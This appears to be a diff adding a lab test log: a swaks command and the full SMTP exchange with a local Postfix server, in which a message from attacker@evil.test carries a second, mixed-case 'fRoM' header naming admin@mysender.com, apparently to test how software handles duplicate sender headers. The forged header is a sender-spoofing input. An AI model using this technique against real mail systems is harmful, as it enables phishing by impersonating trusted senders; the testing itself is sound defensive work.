@@ -1,0 +1,40 @@
+# Test: mixed_case_header_name
+# Time: 2026-03-20 13:10:42
+# Command:
+swaks --server localhost --port 25 --timeout 20 --to vagrant@myreceiver.com --from attacker@evil.test --add-header fRoM:\ admin@mysender.com --header Subject:\ \[TEST8\]\ mixed-case\ header\ name --body Mixed-case\ header\ field\ name. 
+
+=== Trying localhost:25...
+=== Connected to localhost.
+<-  220 mail.mysender.com ESMTP Postfix (Ubuntu)
+ -> EHLO mail.mysender.com
+<-  250-mail.mysender.com
+<-  250-PIPELINING
+<-  250-SIZE 10240000
+<-  250-VRFY
+<-  250-ETRN
+<-  250-ENHANCEDSTATUSCODES
+<-  250-8BITMIME
+<-  250-DSN
+<-  250 CHUNKING
+ -> MAIL FROM:<attacker@evil.test>
+<-  250 2.1.0 Ok
+ -> RCPT TO:<vagrant@myreceiver.com>
+<-  250 2.1.5 Ok
+ -> DATA
+<-  354 End data with <CR><LF>.<CR><LF>
+ -> Date: Fri, 20 Mar 2026 13:10:42 +0000
+ -> To: vagrant@myreceiver.com
+ -> From: attacker@evil.test
+ -> Subject: [TEST8] mixed-case header name
+ -> Message-Id: <20260320131042.002556@mail.mysender.com>
+ -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
+ -> fRoM: admin@mysender.com
+ -> 
+ -> Mixed-case header field name.
+ -> 
+ -> 
+ -> .
+<-  250 2.0.0 Ok: queued as 15EB83F0CB
+ -> QUIT
+<-  221 2.0.0 Bye
+=== Connection closed with remote host.
